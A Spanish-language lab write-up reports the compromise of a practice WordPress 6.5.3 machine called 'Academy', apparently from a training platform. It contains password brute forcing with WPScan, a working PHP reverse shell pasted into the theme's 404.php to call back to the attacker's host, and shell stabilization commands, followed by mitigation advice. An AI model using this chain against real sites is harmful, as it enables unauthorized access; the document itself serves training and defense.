# Informe de ExplotaciÃ³n - MÃ¡quina "Academy" (The Hacker Labs)
**IP Objetivo:** IP_DE_LA_MAQUINA
**Fecha:** 23 Julio 2026
**Autor:** Kali (opencode)

---

## 1. RESUMEN EJECUTIVO

Se ha obtenido acceso inicial a la mÃ¡quina "Academy" comprometiendo un sitio WordPress 6.5.3 mediante fuzzing recursivo, enumeraciÃ³n con WPScan, fuerza bruta de credenciales y explotaciÃ³n del editor de temas para obtener una reverse shell como `www-data`.

**Vectores de ataque utilizados:**
1. `dirsearch -r` â†’ Descubrimiento de `/wordpress` â†’ ConfiguraciÃ³n `/etc/hosts`
2. WPScan â†’ EnumeraciÃ³n de usuarios y plugins (Elementor)
3. WPScan brute force â†’ Credenciales `Dylan` / `password1`
4. Login `/wp-admin` â†’ Editor de temas â†’ Reverse shell PHP en `404.php`
5. EstabilizaciÃ³n de shell â†’ Acceso como `www-data`

**Nota:** La escalada de privilegios a root quedÃ³ pendiente para un mÃ³dulo posterior.

**Cadena de compromiso:** WordPress â†’ Dylan â†’ www-data

---

## 2. RECONOCIMIENTO INICIAL

### 2.1 Descubrimiento de host
```bash
sudo netdiscover -r 10.0.2.0/24
```

**Resultado:** Se localizÃ³ la mÃ¡quina objetivo en la red local.

### 2.2 Escaneo de puertos (Nmap)
```bash
sudo nmap -sV -p- IP_DE_LA_MAQUINA
```

**Resultado:**
| Puerto | Estado | Servicio | VersiÃ³n |
|--------|--------|----------|---------|
| 22/tcp | Open | SSH | OpenSSH |
| 80/tcp | HTTP | Apache | Apache httpd |

**Por quÃ©:** Identificar superficie de ataque. Web en puerto 80 es vector principal.

---

## 3. ENUMERACIÃ“N WEB

### 3.1 Fuzzing recursivo de directorios (dirsearch)
```bash
dirsearch -u http://IP_DE_LA_MAQUINA/ -r -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

**Resultado:**
- `/wordpress` (cÃ³digo 301, redirecciÃ³n)
- `wp-login.php`
- `wp-content/uploads`
**Por quÃ©:** El flag `-r` activa la enumeraciÃ³n recursiva. Sin recursividad no se habrÃ­an descubierto las rutas internas.

### 3.2 ConfiguraciÃ³n de /etc/hosts
```bash
sudo nano /etc/hosts
```

AÃ±adir la lÃ­nea:
```
IP_DE_LA_MAQUINA academy.thehackerlabs
```

**Por quÃ©:** WordPress usa el dominio `academy.thehackerlabs`. Sin esta configuraciÃ³n, el navegador y WPScan no resuelven el dominio. La redirecciÃ³n 301 causa que las herramientas fallen.

---

## 4. ENUMERACIÃ“N CMS (WPScan)

### 4.1 DetecciÃ³n del CMS
```bash
wpscan --url http://academy.thehackerlabs/wordpress
```

**Resultado:**
- WordPress **versiÃ³n 6.5.3**
- Presencia de `xmlrpc.php`
- Presencia de `readme.html`
- Directorio `wp-content/uploads` accesible

### 4.2 EnumeraciÃ³n de usuarios
```bash
wpscan --url http://academy.thehackerlabs/wordpress -e u
```

**Resultado:** Se enumeraron los usuarios vÃ¡lidos del WordPress.

### 4.3 EnumeraciÃ³n de plugins
```bash
wpscan --url http://academy.thehackerlabs/wordpress --enumerate ap
```

**Resultado:** Se detectÃ³ el plugin **Elementor**.

### 4.4 Plugins vulnerables con API Token
```bash
wpscan --url http://academy.thehackerlabs/wordpress --enumerate vp --api-token {API_TOKEN}
```

**Resultado:** Se listaron vulnerabilidades con sus CVEs.

---

## 5. CRACKING DE CREDENCIALES

### 5.1 Fuerza bruta WordPress (WPScan)
```bash
wpscan --url http://academy.thehackerlabs/wordpress --enumerate ap --passwords /usr/share/wordlists/rockyou.txt
```

**Resultado:**
```
Usuario: Dylan
ContraseÃ±a: password1
```

**Por quÃ©:** La fuerza bruta es el Ãºltimo recurso. En WordPress se prefiere WPScan frente a Hydra o Burp Intruder. `password1` es una contraseÃ±a tÃ­pica de rockyou.txt.

---

## 6. ACCESO INICIAL

### 6.1 Login al panel de WordPress
```bash
# Acceder a http://academy.thehackerlabs/wp-admin
# Iniciar sesiÃ³n con: Dylan / password1
```

**Resultado:** Se accediÃ³ al panel de administraciÃ³n de WordPress.

### 6.2 RCE: Reverse Shell por editor de temas

**Pasos:**
1. Ir a **Apariencia â†’ Editor de temas**
2. Seleccionar la plantilla **`404.php`**
3. Pegar una **reverse shell PHP**:

```php
<?php
$sock = fsockopen("IP_KALI", 1234);
$proc = proc_open("/bin/bash -i", array(0=>$sock, 1=>$sock, 2=>$sock), $pipes);
?>
```

4. Guardar cambios

### 6.3 Reverse Shell: De HTTP a TCP

**En Kali (listener):**
```bash
nc -lvnp 1234
```

**Disparar la shell:**
Visitar `http://academy.thehackerlabs/wordpress/404.php` en el navegador.

**Resultado:**
```
connect to [IP_KALI] from (UNKNOWN) [IP_MAQUINA] xxxx
bash: no hay control de trabajos en este shell
www-data@academy:~$
```

**Por quÃ©:** El trÃ¡fico cambia de HTTP a TCP. Una vez dentro, el WAF (Wordfence) ya no protege. ActÃºa a nivel de aplicaciÃ³n; dentro solo queda el firewall del sistema.

### 6.4 EstabilizaciÃ³n de la shell
```bash
# En la shell reverse
python3 -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm

# Ctrl+Z para suspender
# En Kali:
stty raw -echo; fg

# Presionar Enter
whoami
id
```

**Resultado:**
```
www-data
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

---

## 7. ENUMERACIÃ“N POST-EXPLOTACIÃ“N

### 7.1 VerificaciÃ³n de usuario
```bash
whoami
# www-data
id
# uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

**Nota:** La escalada de privilegios a root quedÃ³ pendiente para el mÃ³dulo de escalada. No se obtuvo la flag de root en esta sesiÃ³n.

---

## 8. CADENA DE ATAQUE COMPLETA

```
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚ CADENA DE EXPLOTACIÃ“N â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚ â”‚
â”‚ [1] RECONOCIMIENTO â”‚
â”‚ â”Œâ”€ Nmap â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â” â”‚
â”‚ â”‚ Puertos: 22(SSH), 80(HTTP) â”‚
â”‚ â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜ â”‚
â”‚ â”‚ â”‚
â”‚ â–¼ â”‚
â”‚ [2] ENUMERACIÃ“N WEB â”‚
â”‚ â”Œâ”€ dirsearch -r â”€â”€â”€â”€â”€â”€â”€â”€â”€â” â”Œâ”€ /wordpress (301) â”€â”€â”€â”€â”€â”€â”€â”€â”€â” â”‚
â”‚ â”‚ Fuzzing recursivo â”‚â”€â”€â”€â”€â–¶â”‚ RedirecciÃ³n a dominio â”‚ â”‚
â”‚ â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜ â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜ â”‚
â”‚ â”‚ â”‚
â”‚ â–¼ â”‚
â”‚ [3] CONFIGURACIÃ“N DOMINIO â”‚
â”‚ â”Œâ”€ /etc/hosts â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â” â”Œâ”€ academy.thehackerlabs â”€â”€â”€â”€â” â”‚
â”‚ â”‚ IP â†’ dominio â”‚â”€â”€â”€â”€â–¶â”‚ ResoluciÃ³n DNS local â”‚ â”‚
â”‚ â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜ â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜ â”‚
â”‚ â”‚ â”‚
â”‚ â–¼ â”‚
â”‚ [4] ENUMERACIÃ“N CMS â”‚
â”‚ â”Œâ”€ WPScan â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â” â”Œâ”€ WordPress 6.5.3 â”€â”€â”€â”€â”€â”€â”€â”€â”€â” â”‚
â”‚ â”‚ VersiÃ³n + plugins â”‚â”€â”€â”€â”€â–¶â”‚ Elementor detectado â”‚ â”‚
â”‚ â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜ â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜ â”‚
â”‚ â”‚ â”‚
â”‚ â–¼ â”‚
â”‚ [5] CRACKING DE CREDENCIALES â”‚
â”‚ â”Œâ”€ WPScan brute force â”€â”€â”€â” â”Œâ”€ Dylan / password1 â”€â”€â”€â”€â”€â”€â”€â”€â” â”‚
â”‚ â”‚ rockyou.txt â”‚â”€â”€â”€â”€â–¶â”‚ Credenciales encontradas â”‚ â”‚
â”‚ â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜ â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜ â”‚
â”‚ â”‚ â”‚
â”‚ â–¼ â”‚
â”‚ [6] ACCESO AL PANEL â”‚
â”‚ â”Œâ”€ /wp-admin â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â” â”Œâ”€ Editor de temas â”€â”€â”€â”€â”€â”€â”€â”€â”€â” â”‚
â”‚ â”‚ Login con Dylan â”‚â”€â”€â”€â”€â–¶â”‚ 404.php â†’ reverse shell â”‚ â”‚
â”‚ â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜ â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜ â”‚
â”‚ â”‚ â”‚
â”‚ â–¼ â”‚
â”‚ [7] REVERSE SHELL â”‚
â”‚ â”Œâ”€ nc -lvnp 1234 â”€â”€â”€â”€â”€â”€â”€â”€â” â”Œâ”€ www-data shell â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â” â”‚
â”‚ â”‚ TCP connection â”‚â”€â”€â”€â”€â–¶â”‚ HTTP â†’ TCP bypass WAF â”‚ â”‚
â”‚ â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜ â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜ â”‚
â”‚ â”‚ â”‚
â”‚ â–¼ â”‚
â”‚ [8] ESTABILIZACIÃ“N â”‚
â”‚ â”Œâ”€ python3 pty â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â” â”Œâ”€ Shell estable â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â” â”‚
â”‚ â”‚ TTY spawn â”‚â”€â”€â”€â”€â–¶â”‚ Acceso inicial logrado â”‚ â”‚
â”‚ â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜ â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜ â”‚
â”‚ â”‚ â”‚
â”‚ â–¼ â”‚
â”‚ [9] ESTADO FINAL â”‚
â”‚ â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â” â”‚
â”‚ â”‚ USER (www-data): Acceso logrado â”‚ â”‚
â”‚ â”‚ ROOT: PENDIENTE (mÃ³dulo de escalada) â”‚ â”‚
â”‚ â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜ â”‚
â”‚ â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
```

---

## 9. VULNERABILIDADES IDENTIFICADAS

| # | Vulnerabilidad | Severidad | UbicaciÃ³n | Impacto |
|---|----------------|-----------|-----------|---------|
| 1 | Fuerza bruta WordPress sin rate limiting | ALTA | `/wp-login.php` | Acceso al panel administrativo |
| 2 | ContraseÃ±a dÃ©bil (`password1`) | ALTA | Usuario Dylan | Cracking trivial con rockyou.txt |
| 3 | Editor de temas sin restricciÃ³n | CRÃTICA | `/wp-admin` â†’ Editor de temas | RCE via reverse shell PHP |
| 4 | Plantilla 404.php ejecuta PHP | ALTA | `/wordpress/404.php` | VehÃ­culo para reverse shell |
| 5 | WordPress 6.5.3 potencialmente vulnerable | MEDIA | Core de WordPress | Posibles CVEs conocidos |
| 6 | WAF a nivel de aplicaciÃ³n (Wordfence) | BAJA | Plugin WordPress | Bypass via cambio de protocolo HTTPâ†’TCP |

---

## 10. RECOMENDACIONES DE MITIGACIÃ“N

1. **Implementar rate limiting en wp-login.php** â€” Bloquear despuÃ©s de N intentos fallidos
2. **Usar contraseÃ±as fuertes** â€” PolÃ­tica de complejidad; `password1` es inaceptable
3. **Restringir acceso al editor de temas** â€” Solo administradores con rol especÃ­fico
4. **Deshabilitar editor de temas en producciÃ³n** â€” AÃ±adir `define('DISALLOW_FILE_EDIT', true);` en `wp-config.php`
5. **Mantener WordPress actualizado** â€” Actualizar core, plugins y temas regularmente
6. **Implementar 2FA** â€” AutenticaciÃ³n de dos factores para wp-admin
7. **Usar WAF externo** â€” Cloudflare, Sucuri o similar antes de WordPress
8. **Monitorear logs de WordPress** â€” Alertar sobre intentos de login sospechosos
9. **Implementar Content Security Policy** â€” Restringir scripts ejecutables
10. **Auditar plugins periÃ³dicamente** â€” Eliminar plugins no utilizados (Elementor, etc.)

---

## 11. COMANDOS CLAVE UTILIZADOS

```bash
# Reconocimiento
sudo netdiscover -r 10.0.2.0/24
sudo nmap -sV -p- IP_DE_LA_MAQUINA

# EnumeraciÃ³n web
dirsearch -u http://IP_DE_LA_MAQUINA/ -r -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt

# ConfiguraciÃ³n dominio
sudo nano /etc/hosts
# IP_DE_LA_MAQUINA academy.thehackerlabs

# EnumeraciÃ³n WordPress
wpscan --url http://academy.thehackerlabs/wordpress
wpscan --url http://academy.thehackerlabs/wordpress -e u
wpscan --url http://academy.thehackerlabs/wordpress --enumerate ap
wpscan --url http://academy.thehackerlabs/wordpress --enumerate vp --api-token {API_TOKEN}

# Brute force
wpscan --url http://academy.thehackerlabs/wordpress --enumerate ap --passwords /usr/share/wordlists/rockyou.txt

# Reverse shell
nc -lvnp 1234
# Visitar http://academy.thehackerlabs/wordpress/404.php

# EstabilizaciÃ³n
python3 -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm
# Ctrl+Z
stty raw -echo; fg
```

---

## 12. EVIDENCIAS DE COMPROMISO

```
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚ FLAGS OBTENIDAS â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚ USER (www-data): Acceso logrado â”‚
â”‚ ROOT: PENDIENTE (mÃ³dulo de escalada) â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜

â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚ ACCESOS LOGRADOS â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚ âœ“ WPScan â†’ EnumeraciÃ³n de usuarios y plugins â”‚
â”‚ âœ“ Brute force â†’ Dylan / password1 â”‚
â”‚ âœ“ Login wp-admin â†’ Panel de administraciÃ³n â”‚
â”‚ âœ“ Editor de temas â†’ Reverse shell PHP en 404.php â”‚
â”‚ âœ“ Shell www-data estabilizada con python3 pty â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜

â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚ NOTA â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚ La escalada de privilegios a root NO fue completada â”‚
â”‚ en esta sesiÃ³n. Queda pendiente para un mÃ³dulo posterior. â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
```

---

**FIN DEL INFORME**

â†’
â†’

â†’

